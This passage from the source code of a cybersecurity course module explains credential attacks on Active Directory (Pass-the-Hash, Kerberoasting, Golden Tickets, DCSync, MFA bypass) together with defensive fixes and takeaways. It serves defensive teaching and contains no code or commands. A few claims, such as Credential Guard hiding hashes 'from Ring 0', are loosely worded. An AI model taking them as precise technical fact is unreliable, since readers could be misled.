          fix="Apply least-privilege to service accounts. Most services need specific permissions (read access to target systems, write to specific paths) — not Domain Admin. Use Group Managed Service Accounts (gMSA) with 240-character auto-rotating passwords for any service that needs AD authentication. Audit for over-privileged service accounts quarterly."
        />

        <Err
          title="Believing MFA protects against all credential-based attacks"
          cause="MFA protects the authentication event (login). It does not protect against: Pass-the-Hash (attacker reuses the hash, bypassing the authentication flow entirely), Golden Ticket (Kerberos ticket forged, no authentication event on the DC), session cookie theft (session was established before MFA was bypassed), or AiTM phishing (TOTP-based MFA)."
          fix="MFA significantly raises the bar and stops the majority of attacks. Complement with: FIDO2 for phishing-resistant MFA, Credential Guard to prevent hash extraction, short session lifetimes to limit cookie theft impact, and device-bound sessions (Conditional Access with device compliance checks)."
        />

        <Err
          title="Resetting the KRBTGT password only once after a Golden Ticket is discovered"
          cause="After the first KRBTGT reset, existing Golden Tickets (forged with the old hash) remain valid until their (possibly years-long) ticket lifetime expires — or until the second reset happens and the previous hash is no longer accepted. Many incident responders do one reset and consider the Golden Ticket removed, leaving a window of exposure."
          fix="Reset KRBTGT twice, with the maximum TGT lifetime (default 10 hours) between resets. After the first reset, old TGTs signed with the original hash are still valid for up to 10 hours. After the second reset, TGTs signed with the first-reset hash expire. Allow 10 hours between resets, then verify no suspicious authentications in that window."
        />

        <Err
          title="Treating a Kerberoasting-cracked password as the end of the incident"
          cause="When a service account password is cracked via Kerberoasting, teams often just reset the password and close the ticket. But Kerberoasting is a step in an attack, not the attack itself. If the service account had Domain Admin rights, the attacker likely used it to run DCSync, create Golden Tickets, or create backdoor accounts before the incident was detected."
          fix="Kerberoasting discovery should trigger a full AD forensic investigation: check all actions performed by the compromised service account in the previous 30 days (event logs, SIEM), look for new accounts or group membership changes, run BloodHound from a clean machine to find attack paths, and check the KRBTGT password last reset date for Golden Ticket timing."
        />
      </Part>

      <HR />

      <KeyTakeaways
        items={[
          'NTLM authenticates using the NT hash (MD4 of the password) — an attacker with the hash can authenticate as that user without knowing the password. This is Pass-the-Hash.',
          'Kerberoasting works because any domain user can request service tickets encrypted with service account hashes. Service accounts with weak passwords are cracked offline without generating alerts.',
          'KRBTGT hash compromise enables Golden Tickets — forged TGTs valid for any user for any period. Recovery requires two KRBTGT password resets separated by the maximum TGT lifetime.',
          'DCSync allows an attacker with Replicating Directory Changes permissions to pull all domain password hashes without touching the DC — appearing as a legitimate replication event.',
          'Credential stuffing uses breach databases (billions of email:password pairs) tested against other services. A 0.1-2% success rate against a 10M pair database means 10K-200K valid logins.',
          'MFA fatigue attacks send dozens of push notification requests until the user approves. Number matching (user must type the displayed code) defeats accidental approvals.',
          'AiTM phishing bypasses TOTP MFA by proxying authentication in real-time and capturing the session cookie after MFA completes. FIDO2/passkeys defeat this via cryptographic origin binding.',
          'Password spraying (one password against many accounts) evades lockout policies. Defence requires MFA, smart lockout, and leaked password detection — not just lockout thresholds.',
          'Service accounts with Domain Admin privileges are the highest-value Kerberoasting targets. Group Managed Service Accounts (gMSA) with 240-character auto-rotating passwords eliminate this risk.',
          'Credential Guard stores LSASS credentials in a Hyper-V isolated virtual machine, making mimikatz-style hash extraction fail — NT hashes are no longer accessible from Ring 0.',
        ]}
      />

      <HR />

      <div style={{ background: 'var(--code-bg)', borderRadius: 12, padding: '28px 32px', marginTop: 40 }}>
        <div style={{ fontSize: 13, color: C, fontWeight: 700, marginBottom: 8, textTransform: 'uppercase', letterSpacing: 1 }}>
          Up Next — Module 13
        </div>
        <div style={{ fontSize: 22, fontWeight: 700, color: 'var(--heading)', marginBottom: 12 }}>
          Vulnerabilities and Exploits
        </div>
        <p style={{ ...s.p, marginBottom: 20 }}>
          In Module 13, you learn the language of vulnerabilities: CVE IDs, CVSS scores, CWE classifications, and the full patch lifecycle from disclosure to exploitation. How zero-days are discovered and sold. Why organisations consistently fail to patch critical vulnerabilities before they're exploited. And how to run a vulnerability management program that prioritises by actual risk rather than CVSS score alone.
        </p>
        <Link
          href="/learn/cybersecurity/vulnerabilities-and-exploits"
          style={{
            display: 'inline-block',
            background: C,
            color: '#fff',
            padding: '12px 28px',
            borderRadius: 8,
            fontWeight: 700,
            fontSize: 15,
            textDecoration: 'none',
          }}
        >
          Continue to Module 13 →
        </Link>
      </div>
    </LearnLayout>
  )
}
